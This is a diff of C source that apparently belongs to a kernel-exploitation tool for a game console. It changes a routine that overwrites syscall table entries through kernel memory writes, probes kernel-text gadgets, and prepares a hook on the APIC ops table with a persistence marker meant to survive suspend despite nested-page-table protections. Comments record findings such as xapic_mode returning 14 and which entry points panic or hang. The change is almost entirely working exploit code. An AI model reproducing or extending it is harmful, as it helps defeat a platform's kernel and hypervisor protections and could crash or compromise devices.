@@ -5353,11 +5353,19 @@ static void campaign_flatz_setup(void) {
             int32_t p9_zero_narg = 0;
 
             /*
-             * Step 1: Verify xapic_mode (ops[2]) returns 1.
+             * Step 1: Call xapic_mode (ops[2]) and record its ACTUAL return value.
              * This is the ONLY apic_ops function safe to call — it just
              * returns a constant and doesn't access hardware.
+             *
+             * RESEARCH RESULT (Session 11):
+             *   xapic_mode returns 14 (0x0E), NOT 1 as previously assumed.
+             *   Any hook replacing apic_ops[2] must return this same value.
+             *   The earlier "mov eax, 1; ret" gadget approach was wrong —
+             *   it would have returned the incorrect value even if NPT
+             *   hadn't blocked execution.
              */
-            printf("[*] Step 1: Verify xapic_mode (ops[2]) returns 1...\n");
+            long p9_xapic_retval = 0;
+            printf("[*] Step 1: Call xapic_mode (ops[2]) to get actual return value...\n");
             {
                 uint64_t target = ops[2];
                 kernel_copyin(&target, g_dmap_base + p9_s253_call_pa, 8);
@@ -5370,9 +5378,16 @@ static void campaign_flatz_setup(void) {
                 kernel_copyin(&p9_orig_call, g_dmap_base + p9_s253_call_pa, 8);
                 kernel_copyin(&p9_orig_narg, g_dmap_base + p9_s253_narg_pa, 4);
 
-                printf("    xapic_mode 0x%016lx → ret=%ld errno=%d %s\n",
-                       (unsigned long)target, ret, err,
-                       (ret == 1 && err == 0) ? "[OK: returns 1]" : "[UNEXPECTED]");
+                p9_xapic_retval = ret;
+                printf("    xapic_mode 0x%016lx → ret=%ld (0x%lx) errno=%d\n",
+                       (unsigned long)target, ret, (unsigned long)ret, err);
+                if (ret == 1) {
+                    printf("    [OK] Returns 1 (APIC_MODE_XAPIC)\n");
+                } else {
+                    printf("    [!] Returns %ld — NOT 1!\n", ret);
+                    printf("    Any hook must return %ld to match original behavior.\n", ret);
+                    printf("    Previous 'mov eax,1;ret' gadget approach was WRONG.\n");
+                }
                 fflush(stdout);
             }
 
@@ -5395,21 +5410,20 @@ static void campaign_flatz_setup(void) {
             fflush(stdout);
 
             /*
-             * ONLY test entry points with safe calling conventions.
-             *   - nop_ret: nop; ret — harmless, returns RAX
-             *   - justreturn: syscall return path — returns cleanly
+             * ONLY test entry points that are safe to call via sysent.
+             *   - nop_ret: nop; ret — harmless, returns whatever RAX is
              *
-             * DO NOT test doreti_iret or Xinvtlb — these are interrupt/
-             * exception handlers that expect specific stack frames and
-             * CPU state.  Calling them via syscall would corrupt the
-             * stack → kernel panic.
+             * DO NOT test:
+             *   - justreturn: syscall return path — HANGS (loop/deadlock)
+             *   - doreti_iret: iret handler — needs stack frame → panic
+             *   - Xinvtlb: interrupt handler — needs IDT state → panic
+             *   - Other apic_ops: APIC hardware accessors → MMIO panic
              */
             struct {
                 uint64_t offset;
                 const char *name;
             } safe_ktext_targets[] = {
                 { 0x22df36, "nop_ret" },
-                { 0x230670, "justreturn" },
             };
             int n_targets = sizeof(safe_ktext_targets) /
                             sizeof(safe_ktext_targets[0]);
@@ -5432,8 +5446,8 @@ static void campaign_flatz_setup(void) {
                        (unsigned long)safe_ktext_targets[i].offset,
                        ret, err);
 
-                if (ret == 1 && err == 0) {
-                    printf("  *** RETURNS 1 ***");
+                if (ret == p9_xapic_retval && err == 0) {
+                    printf("  *** MATCHES xapic_mode (%ld) ***", p9_xapic_retval);
                     if (!p9_gadget_addr && target != ops[2])
                         p9_gadget_addr = target;
                 }
@@ -5442,24 +5456,22 @@ static void campaign_flatz_setup(void) {
             }
 
             /*
-             * Step 3: If no kstuff offset returned 1, use the ORIGINAL
-             * xapic_mode address itself.  We know it's in ktext and
-             * returns 1.  To distinguish "hook survived" from "kernel
-             * restored to original," we'll rely on a secondary proof:
-             * a unique pre-suspend marker in the kdata cave.
+             * Step 3: If no kstuff offset returned the matching value,
+             * use the ORIGINAL xapic_mode address itself.  We know it's
+             * in ktext and returns the correct value (%ld).
              *
-             * The marker approach:
-             *   - Write a unique Phase 9 marker (P9_ARMED_MAGIC) into
-             *     the cave at offset 0x20 before suspend
-             *   - On resume, if marker persists AND apic_ops[2] ==
-             *     original xapic → system survived with our setup intact
+             * To distinguish "hook survived" from "kernel restored to
+             * original," we use a secondary proof: P9_ARMED_MAGIC marker
+             * at cave+0x20.  If it persists through suspend → our kdata
+             * writes survive, and apic_ops[2] was not reinitialized.
              */
             #define P9_ARMED_MAGIC 0x5039484F4F4B4544ULL  /* "P9HOOKED" */
 
             if (!p9_gadget_addr) {
-                printf("\n[*] No kstuff offset returns 1.\n");
+                printf("\n[*] No kstuff offset returns %ld (xapic_mode value).\n",
+                       p9_xapic_retval);
                 printf("    Using original xapic_mode as ktext hook target.\n");
-                printf("    Will use P9_ARMED_MAGIC marker to verify hook was active.\n");
+                printf("    Will use P9_ARMED_MAGIC marker to verify persistence.\n");
                 p9_gadget_addr = ops[2];
             }
 
@@ -5478,7 +5490,8 @@ static void campaign_flatz_setup(void) {
             } else {
                 printf("[+] Target = DIFFERENT from original (direct proof on resume)\n");
             }
-            printf("[+] Returns 1 (APIC_MODE_XAPIC) — safe for suspend hook.\n");
+            printf("[+] xapic_mode returns: %ld (hook must match this value)\n",
+                   p9_xapic_retval);
             printf("[+] This is in ktext → NPT allows execution during suspend!\n");
             printf("\n");
             fflush(stdout);
